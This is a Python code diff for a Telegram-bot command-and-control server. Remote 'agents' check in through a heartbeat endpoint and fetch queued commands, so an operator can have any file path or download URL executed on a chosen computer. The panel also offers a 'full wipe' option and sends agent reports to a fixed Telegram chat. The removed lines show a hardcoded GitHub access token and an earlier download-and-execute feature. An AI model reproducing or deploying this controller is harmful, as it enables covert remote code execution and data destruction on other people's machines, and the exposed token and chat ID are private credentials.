@@ -1,6 +1,5 @@
 import os
-import base64
-import requests
+import time
 import telebot
 from flask import Flask, request, jsonify
 
@@ -9,11 +8,13 @@ bot = telebot.TeleBot(TOKEN, threaded=False)
 
 app = Flask(__name__)
 
-GITHUB_TOKEN = "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"
-GITHUB_REPO = "mam4939/agent-db"
+# Словарь активных компьютеров: { "PC_NAME": timestamp_последнего_пинга }
+active_computers = {}
+
+# Очередь команд для компьютеров: { "PC_NAME": "команда" }
+pending_commands = {}
 
 selected_computer = None
-pending_command = {}
 
 @app.route(f"/{TOKEN}", methods=["POST"])
 def webhook():
@@ -24,20 +25,31 @@ def webhook():
         return "", 200
     return "Forbidden", 403
 
+# Эндпоинт для агента: пинг и регистрация
+@app.route("/api/heartbeat", methods=["POST"])
+def heartbeat():
+    data = request.json
+    if data and "pc" in data:
+        pc_name = data["pc"]
+        active_computers[pc_name] = time.time()
+    return jsonify({"status": "ok"}), 200
+
+# Эндпоинт для агента: забрать команду
 @app.route("/api/get_command", methods=["GET"])
 def get_command():
     pc_name = request.args.get("pc", "")
-    cmd = pending_command.get(pc_name, "")
-    if pc_name in pending_command:
-        pending_command[pc_name] = ""
+    cmd = pending_commands.get(pc_name, "")
+    if pc_name in pending_commands:
+        pending_commands[pc_name] = ""
     return jsonify({"command": cmd}), 200
 
+# Эндпоинт для отчетов от агента
 @app.route("/api/report", methods=["POST"])
 def report():
     data = request.json
     if data and "message" in data:
-        chat_id = data.get("chat_id", "8172067310")
-        bot.send_message(chat_id, f"Отчет:\n{data['message']}")
+        chat_id = "8172067310"
+        bot.send_message(chat_id, f"Отчет от ПК [{data.get('pc', 'Unknown')}]:\n{data['message']}")
     return "OK", 200
 
 @app.route("/", methods=["GET"])
@@ -47,98 +59,53 @@ def index():
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.row("Список компьютеров", "Запустить")
+    markup.row("Список компьютеров", "Запустить файл")
     markup.row("Полный Wipe")
-    bot.send_message(message.chat.id, "Панель управления.", reply_markup=markup)
+    bot.send_message(message.chat.id, "Панель управления активна.", reply_markup=markup)
 
 @bot.message_handler(func=lambda msg: msg.text == "Список компьютеров")
 def list_computers(message):
-    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
-    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/computers"
-    
-    try:
-        res = requests.get(url, headers=headers)
-        if res.status_code == 200:
-            items = res.json()
-            markup = telebot.types.InlineKeyboardMarkup()
-            count = 0
-            for item in items:
-                if item["type"] == "dir":
-                    pc_name = item["name"]
-                    markup.add(telebot.types.InlineKeyboardButton(f"ПК: {pc_name}", callback_data=f"select_pc:{pc_name}"))
-                    count += 1
-            
-            if count == 0:
-                bot.send_message(message.chat.id, "Папка computers пуста. Агент еще не передал данные.")
-                return
-                
-            markup.add(telebot.types.InlineKeyboardButton("Назад", callback_data="menu_main"))
-            bot.send_message(message.chat.id, "Выберите компьютер из списка:", reply_markup=markup)
-        elif res.status_code == 404:
-            bot.send_message(message.chat.id, "Папка computers еще не создана на GitHub. Запустите агент.")
-        else:
-            bot.send_message(message.chat.id, f"Ошибка GitHub API: {res.status_code}")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
+    global active_computers
+    # Удаляем те ПК, которые не выходили на связь более 30 секунд
+    current_time = time.time()
+    offline_pcs = [pc for pc, t in active_computers.items() if current_time - t > 30]
+    for pc in offline_pcs:
+        del active_computers[pc]
 
-@bot.message_handler(func=lambda msg: msg.text == "Запустить")
-def github_explorer(message):
+    if not active_computers:
+        bot.send_message(message.chat.id, "Нет активных компьютеров в сети.")
+        return
+
+    markup = telebot.types.InlineKeyboardMarkup()
+    for pc_name in active_computers.keys():
+        markup.add(telebot.types.InlineKeyboardButton(f"ПК: {pc_name} [В сети]", callback_data=f"select_pc:{pc_name}"))
+    markup.add(telebot.types.InlineKeyboardButton("Назад", callback_data="menu_main"))
+    bot.send_message(message.chat.id, "Активные компьютеры:", reply_markup=markup)
+
+@bot.message_handler(func=lambda msg: msg.text == "Запустить файл")
+def ask_file_path(message):
     global selected_computer
     if not selected_computer:
         bot.send_message(message.chat.id, "Сначала выберите компьютер в разделе 'Список компьютеров'.")
         return
-    fetch_github_path(message.chat.id, "")
+    msg = bot.send_message(message.chat.id, f"Введите полный путь к файлу или прямую ссылку на файл для запуска на ПК {selected_computer}:")
+    bot.register_next_step_handler(msg, process_custom_exec)
 
-def fetch_github_path(chat_id, path):
-    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
-    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{path}"
-    
-    try:
-        res = requests.get(url, headers=headers)
-        if res.status_code == 200:
-            items = res.json()
-            markup = telebot.types.InlineKeyboardMarkup()
-            for item in items:
-                if item["name"] == "computers":
-                    continue
-                if item["type"] == "dir":
-                    markup.add(telebot.types.InlineKeyboardButton(f"[Папка] {item['name']}", callback_data=f"gh_dir:{item['path']}"))
-                elif item["type"] == "file":
-                    markup.add(telebot.types.InlineKeyboardButton(f"[Файл] {item['name']}", callback_data=f"gh_exec:{item['download_url']}"))
-            
-            if path:
-                parent_path = os.path.dirname(path)
-                markup.add(telebot.types.InlineKeyboardButton("Назад", callback_data=f"gh_dir:{parent_path if parent_path else ''}"))
-            else:
-                markup.add(telebot.types.InlineKeyboardButton("Назад", callback_data="menu_main"))
-                
-            bot.send_message(chat_id, f"Репозиторий ({path if path else 'корень'}):", reply_markup=markup)
-    except Exception as e:
-        bot.send_message(chat_id, f"Ошибка доступа: {str(e)}")
+def process_custom_exec(message):
+    global pending_commands, selected_computer
+    path_or_url = message.text.strip()
+    pending_commands[selected_computer] = f"EXEC:{path_or_url}"
+    bot.send_message(message.chat.id, f"Команда на запуск отправлена на {selected_computer}.")
 
 @bot.callback_query_handler(func=lambda call: True)
 def callbacks(call):
-    global selected_computer, pending_command
+    global selected_computer
     data = call.data
     
     if data.startswith("select_pc:"):
         selected_computer = data.split(":")[1]
         bot.answer_callback_query(call.id, f"Выбран ПК: {selected_computer}")
         bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"Активный компьютер: {selected_computer}")
-        
-    elif data.startswith("gh_dir:"):
-        path = data.split(":")[1]
-        fetch_github_path(call.message.chat.id, path if path != "." else "")
-        
-    elif data.startswith("gh_exec:"):
-        file_url = data.split(":", 1)[1]
-        if not selected_computer:
-            bot.answer_callback_query(call.id, "Компьютер не выбран")
-            return
-        pending_command[selected_computer] = f"DOWNLOAD_AND_EXEC:{file_url}"
-        bot.answer_callback_query(call.id, "Команда отправлена")
-        bot.send_message(call.message.chat.id, f"Команда на запуск отправлена на ПК: {selected_computer}")
-        
     elif data == "menu_main":
         bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="Главное меню.")
 
